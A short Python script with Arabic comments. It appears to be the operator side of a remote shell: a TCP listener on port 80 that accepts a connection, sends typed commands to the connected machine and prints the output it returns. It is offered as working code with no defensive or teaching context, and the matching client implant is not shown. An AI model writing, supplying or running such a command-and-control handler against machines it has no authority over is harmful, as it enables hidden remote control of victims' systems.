import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 80))  # استمع على جميع الواجهات
    server_socket.listen(1)
    print("انتظر اتصال العميل...")

    client_socket, addr = server_socket.accept()
    print(f"تم الاتصال من {addr}")

    while True:
        command = input("أدخل الأمر: ")
        client_socket.send(command.encode())

        if command.lower() == "exit":
            break

        output = client_socket.recv(4096).decode()
        print(output)

    client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()